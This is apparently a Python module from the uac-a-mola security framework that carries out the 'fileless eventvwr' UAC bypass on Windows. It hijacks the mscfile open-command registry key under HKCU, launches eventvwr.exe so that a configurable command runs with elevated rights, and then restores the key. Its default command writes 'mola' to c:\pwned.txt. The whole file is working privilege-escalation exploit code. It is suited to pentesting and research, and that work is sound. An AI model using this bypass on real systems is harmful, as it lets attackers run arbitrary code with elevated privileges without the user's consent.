# This file is part of uac-a-mola
# Author: Pablo Gonzalez (pablo@11paths.com)
#
# DESCRIPTION
# Fileless - Eventvwr bypass UAC 


from module import Module
import psutil
from termcolor import colored
from support.winreg import Registry
from _winreg import HKEY_CURRENT_USER as HKCU
import os

class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Fileless Eventvwr",
                       "Description": "Fileless - Eventvwr bypass UAC ",
                       "Author": "Pablo Gonzalez"}

        # -----------name-----default_value--description
        options = {"instruction": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
                   }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

        # Class atributes, initialization in the run_module method
        # after the user has set the values
        self.reg = Registry()

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        print "Creating hive..."
        k = self.reg.create_key(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command")
        print "Created hive"
        print "Setting 'Default'..."
        self.reg.set_value(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command", self.args["instruction"])
        print "Done!"
        print "Executing... eventvwr.exe"
        os.system("c:\windows\system32\eventvwr.exe")
        print "Got it? :D"
        print "Now... Deleting hive!"
        self.reg.restore(k)
        print "Deleted!"

			